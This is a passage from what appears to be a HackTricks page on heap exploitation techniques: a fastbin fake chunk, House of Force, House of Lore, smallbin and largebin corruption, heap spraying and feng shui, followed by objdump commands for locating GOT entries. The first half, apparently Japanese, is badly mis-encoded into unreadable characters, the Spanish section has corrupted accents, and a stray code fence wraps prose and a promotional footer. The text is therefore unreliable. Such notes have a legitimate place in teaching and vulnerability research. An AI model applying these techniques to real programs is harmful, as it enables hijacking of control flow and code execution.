ã—ãŸãŒã£ã¦ã€ã“ã®ãƒã‚¤ãƒ³ã‚¿ã‚’ä»»æ„ã®å ´æ‰€ã«æŒ‡ã™ã‚ˆã†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãŸã ã—ã€ã©ã®å ´æ‰€ã§ã‚‚æœ‰åŠ¹ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚å½ã®ãƒãƒ£ãƒ³ã‚¯ã®ã‚µã‚¤ã‚ºã¯av->max\_fastã‚ˆã‚Šå°ã•ãã€ã‚ˆã‚Šå…·ä½“çš„ã«ã¯å°†æ¥ã®malloc()å‘¼ã³å‡ºã—ã§è¦æ±‚ã•ã‚Œã‚‹ã‚µã‚¤ã‚º+8ã¨åŒã˜ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ã“ã®è„†å¼±ãªãƒã‚¤ãƒ³ã‚¿ã®å¾Œã«malloc(40)ãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‹ã£ã¦ã„ã‚‹å ´åˆã€å½ã®ãƒãƒ£ãƒ³ã‚¯ã®ã‚µã‚¤ã‚ºã¯48ã¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ãŸã¨ãˆã°ã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã«æ•°å€¤ã‚’å°‹ã­ã‚‹å ´åˆã€48ã‚’å…¥åŠ›ã—ã€mallocã®ãƒã‚¤ãƒ³ã‚¿ã‚’æ¬¡ã®4ãƒã‚¤ãƒˆã«æŒ‡ã™ã“ã¨ãŒã§ãã¾ã™ï¼ˆã“ã‚Œã‚‰ã¯å¹¸é‹ãªå ´åˆã€EBPã«å±ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€48ã¯å¾Œã‚ã«æ®‹ã‚Šã¾ã™ã€‚ã‚µã‚¤ã‚ºã®ãƒ˜ãƒƒãƒ€ãƒ¼ã¨ã—ã¦ï¼‰ã€‚ã•ã‚‰ã«ã€ptr-4+48ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ã¯ã„ãã¤ã‹ã®æ¡ä»¶ã‚’æº€ãŸã™å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆã“ã®å ´åˆã€ptr=EBPã§ã‚ã‚‹ï¼‰ã€‚

ã“ã‚ŒãŒæº€ãŸã•ã‚Œã‚‹ã¨ã€æ¬¡ã«mallocãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ã¨ã€malloc(40)ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«EBPã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒå‰²ã‚Šå½“ã¦ã‚‰ã‚Œã¾ã™ã€‚æ”»æ’ƒè€…ãŒã“ã®mallocã«æ›¸ãè¾¼ã‚€ã“ã¨ã‚‚ã§ãã‚‹å ´åˆã€EBPã¨EIPã®ä¸¡æ–¹ã‚’ä»»æ„ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã§ä¸Šæ›¸ãã§ãã¾ã™ã€‚

ã“ã‚Œã¯ã€free()ãŒã‚¹ã‚¿ãƒƒã‚¯ã®EBPã‚’æŒ‡ã™ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ã€æ–°ã—ã„malloc()ã§äºˆç´„ã™ã‚‹å®Œç’§ãªã‚µã‚¤ã‚ºã®ãƒãƒ£ãƒ³ã‚¯ãŒã‚ã‚‹ã“ã¨ã‚’è¦šãˆã¦ã„ã‚‹ãŸã‚ã ã¨æ€ã‚ã‚Œã¾ã™ã€‚ãã®ãŸã‚ã€ãã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒå‰²ã‚Šå½“ã¦ã‚‰ã‚Œã¾ã™ã€‚

**The House of Force**

å¿…è¦ãªã‚‚ã®ï¼š

* wildernessã‚’ä¸Šæ›¸ãã™ã‚‹ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼
* ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå®šç¾©ã—ãŸã‚µã‚¤ã‚ºã§malloc()ã‚’å‘¼ã³å‡ºã™
* ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå®šç¾©ã—ãŸãƒ‡ãƒ¼ã‚¿ã§malloc()ã‚’å‘¼ã³å‡ºã™

æœ€åˆã«ã€wildernessã®ã‚µã‚¤ã‚ºã‚’éå¸¸ã«å¤§ããªå€¤ï¼ˆ0xffffffffï¼‰ã§ä¸Šæ›¸ãã—ã¦ã€ååˆ†ã«å¤§ããªãƒ¡ãƒ¢ãƒªè¦æ±‚ãŒheapã‚’æ‹¡å¼µã™ã‚‹ã“ã¨ãªã_int\_malloc()ã§å‡¦ç†ã•ã‚Œã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚

æ¬¡ã«ã€av->topã‚’ã€ã‚¹ã‚¿ãƒƒã‚¯ãªã©ã®æ”»æ’ƒè€…ã®åˆ¶å¾¡ä¸‹ã«ã‚ã‚‹ãƒ¡ãƒ¢ãƒªé ˜åŸŸã‚’æŒ‡ã™ã‚ˆã†ã«å¤‰æ›´ã—ã¾ã™ã€‚av->topã«ã¯\&EIP - 8ãŒå…¥ã‚Šã¾ã™ã€‚

æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ãƒ¡ãƒ¢ãƒªé ˜åŸŸã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’av->topã«ä¸Šæ›¸ãã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victimã¯ç¾åœ¨ã®wildernessãƒãƒ£ãƒ³ã‚¯ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆç¾åœ¨ã®av->topï¼‰ã‚’å–å¾—ã—ã€remainderã¯ãã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«malloc()ã«ã‚ˆã£ã¦è¦æ±‚ã•ã‚ŒãŸãƒã‚¤ãƒˆæ•°ã‚’åŠ ãˆãŸã‚‚ã®ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€\&EIP-8ãŒ0xbffff224ã«ã‚ã‚Šã€av->topãŒ0x080c2788ã‚’å«ã‚“ã§ã„ã‚‹å ´åˆã€æ¬¡ã®malloc()ã§av->topãŒ$EIP-8ã‚’æŒ‡ã™ã‚ˆã†ã«ã™ã‚‹ã«ã¯ï¼š

0xbffff224 - 0x080c2788 = 3086207644.

ã“ã‚Œã«ã‚ˆã‚Šã€av->topã«å¤‰æ›´ã•ã‚ŒãŸå€¤ãŒä¿å­˜ã•ã‚Œã€æ¬¡ã®mallocãŒEIPã‚’æŒ‡ã—ã€ãã‚Œã‚’ä¸Šæ›¸ãã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

æ–°ã—ã„wildernessãƒãƒ£ãƒ³ã‚¯ã®ã‚µã‚¤ã‚ºãŒã€æœ€å¾Œã®malloc()ã«ã‚ˆã£ã¦è¦æ±‚ã•ã‚ŒãŸãƒ¡ãƒ¢ãƒªé‡ã‚ˆã‚Šã‚‚å¤§ãã„å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã¤ã¾ã‚Šã€wildernessãŒ\&EIP-8ã‚’æŒ‡ã—ã¦ã„ã‚‹å ´åˆã€ã‚µã‚¤ã‚ºã¯ã¡ã‚‡ã†ã©ã‚¹ã‚¿ãƒƒã‚¯ã®EBPãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«ãªã‚Šã¾ã™ã€‚

**The House of Lore**

**SmallBinã®ç ´æ**

è§£æ”¾ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã¯ã‚µã‚¤ã‚ºã«å¿œã˜ã¦binã«æŒ¿å…¥ã•ã‚Œã¾ã™ã€‚ã—ã‹ã—ã€æŒ¿å…¥ã•ã‚Œã‚‹å‰ã«unsorted binsã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚ãƒãƒ£ãƒ³ã‚¯ãŒè§£æ”¾ã•ã‚Œã‚‹ã¨ã€ã™ãã«é©åˆ‡ãªbinã«æŒ¿å…¥ã•ã‚Œã‚‹ã®ã§ã¯ãªãã€unsorted binsã«æ®‹ã‚Šã¾ã™ã€‚æ¬¡ã«ã€æ–°ã—ã„ãƒãƒ£ãƒ³ã‚¯ãŒå‰²ã‚Šå½“ã¦ã‚‰ã‚Œã€ä»¥å‰ã«è§£æ”¾ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ãŒä½¿ç”¨å¯èƒ½ã§ã‚ã‚Œã°ã€ãã‚ŒãŒè¿”ã•ã‚Œã¾ã™ã€‚ãŸã ã—ã€ã‚ˆã‚Šå¤§ããªãƒãƒ£ãƒ³ã‚¯ãŒå‰²ã‚Šå½“ã¦ã‚‰ã‚Œã‚‹å ´åˆã€unsorted binsã«ã‚ã‚‹è§£æ”¾ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã¯é©åˆ‡ãªbinã«æŒ¿å…¥ã•ã‚Œã¾ã™ã€‚

è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã«åˆ°é”ã™ã‚‹ã«ã¯ã€ãƒ¡ãƒ¢ãƒªè¦æ±‚ãŒav->max\_fastï¼ˆé€šå¸¸72ï¼‰ã‚ˆã‚Šå¤§ããã€MIN\_LARGE\_SIZEï¼ˆ512ï¼‰ã‚ˆã‚Šå°ã•ã„å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```
Si en los bin hay un trozo del tamaÃ±o adecuado a lo que se pide se devuelve ese despuÃ©s de desenlazarlo:

bck = victim->bk; Apunta al trozo anterior, es la Ãºnica info que podemos alterar.

bin->bk = bck; El penÃºltimo trozo pasa a ser el Ãºltimo, en caso de que bck apunte al stack al siguiente trozo reservado se le darÃ¡ esta direcciÃ³n

bck->fd = bin; Se cierra la lista haciendo que este apunte a bin

Se necesita:

Que se reserven dos malloc, de forma que al primero se le pueda hacer overflow despuÃ©s de que el segundo haya sido liberado e introducido en su bin (es decir, se haya reservado un malloc superior al segundo trozo antes de hacer el overflow)

Que el malloc reservado al que se le da la direcciÃ³n elegida por el atacante sea controlada por el atacante.

El objetivo es el siguiente, si podemos hacer un overflow a un heap que tiene por debajo un trozo ya liberado y en su bin, podemos alterar su puntero bk. Si alteramos su puntero bk y este trozo llega a ser el primero de la lista de bin y se reserva, a bin se le engaÃ±arÃ¡ y se le dirÃ¡ que el Ãºltimo trozo de la lista (el siguiente en ofrecer) estÃ¡ en la direcciÃ³n falsa que hayamos puesto (al stack o GOT por ejemplo). Por lo que si se vuelve a reservar otro trozo y el atacante tiene permisos en Ã©l, se le darÃ¡ un trozo en la posiciÃ³n deseada y podrÃ¡ escribir en ella.

Tras liberar el trozo modificado es necesario que se reserve un trozo mayor al liberado, asÃ­ el trozo modificado saldrÃ¡ de unsorted bins y se introducirÃ­a en su bin.

Una vez en su bin es el momento de modificarle el puntero bk mediante el overflow para que apunte a la direcciÃ³n que queramos sobreescribir.

AsÃ­ el bin deberÃ¡ esperar turno a que se llame a malloc() suficientes veces como para que se vuelva a utilizar el bin modificado y engaÃ±e a bin haciÃ©ndole creer que el siguiente trozo estÃ¡ en la direcciÃ³n falsa. Y a continuaciÃ³n se darÃ¡ el trozo que nos interesa.

Para que se ejecute la vulnerabilidad lo antes posible lo ideal serÃ­a: Reserva del trozo vulnerable, reserva del trozo que se modificarÃ¡, se libera este trozo, se reserva un trozo mÃ¡s grande al que se modificarÃ¡, se modifica el trozo (vulnerabilidad), se reserva un trozo de igual tamaÃ±o al vulnerado y se reserva un segundo trozo de igual tamaÃ±o y este serÃ¡ el que apunte a la direcciÃ³n elegida.

Para proteger este ataque se uso la tÃ­pica comprobaciÃ³n de que el trozo â€œnoâ€ es falso: se comprueba si bck->fd estÃ¡ apuntando a victim. Es decir, en nuestro caso si el puntero fd\* del trozo falso apuntado en el stack estÃ¡ apuntando a victim. Para sobrepasar esta protecciÃ³n el atacante deberÃ­a ser capaz de escribir de alguna forma (por el stack probablemente) en la direcciÃ³n adecuada la direcciÃ³n de victim. Para que asÃ­ parezca un trozo verdadero.

**CorrupciÃ³n LargeBin**

Se necesitan los mismos requisitos que antes y alguno mÃ¡s, ademÃ¡s los trozos reservados deben ser mayores a 512.

El ataque es como el anterior, es decir, ha que modificar el puntero bk y se necesitan todas esas llamadas a malloc(), pero ademÃ¡s hay que modificar el size del trozo modificado de forma que ese size - nb sea < MINSIZE.

Por ejemplo harÃ¡ que poner en size 1552 para que 1552 - 1544 = 8 < MINSIZE (la resta no puede quedar negativa porque se compara un unsigned)

AdemÃ¡s se ha introducido un parche para hacerlo aÃºn mÃ¡s complicado.

**Heap Spraying**

BÃ¡sicamente consiste en reservar tooda la memoria posible para heaps y rellenar estos con un colchÃ³n de nops acabados por una shellcode. AdemÃ¡s, como colchÃ³n se utiliza 0x0c. Pues se intentarÃ¡ saltar a la direcciÃ³n 0x0c0c0c0c, y asÃ­ si se sobreescribe alguna direcciÃ³n a la que se vaya a llamar con este colchÃ³n se saltarÃ¡ allÃ­. BÃ¡sicamente la tÃ¡ctica es reservar lo mÃ¡ximos posible para ver si se sobreescribe algÃºn puntero y saltar a 0x0c0c0c0c esperando que allÃ­ haya nops.

**Heap Feng Shui**

Consiste en mediante reservas y liberaciones sementar la memoria de forma que queden trozos reservados entre medias de trozos libres. El buffer a desbordar se situarÃ¡ en uno de los huevos.

**objdump -d ejecutable** â€”> Disas functions\
**objdump -d ./PROGRAMA | grep FUNCION** â€”> Get function address\
**objdump -d -Mintel ./shellcodeout** â€”> Para ver que efectivamente es nuestra shellcode y sacar los OpCodes\
**objdump -t ./exec | grep varBss** â€”> Tabla de sÃ­mbolos, para sacar address de variables y funciones\
**objdump -TR ./exec | grep exit(func lib)** â€”> Para sacar address de funciones de librerÃ­as (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** â€”> Saca la direcciÃ³n de puts a sobreescribir en le GOT\
**objdump -D ./exec** â€”> Disas ALL hasta las entradas de la plt\
**objdump -p -/exec**\
**Info functions strncmp â€”>** Info de la funciÃ³n en gdb

## Interesting courses

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **References**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
```
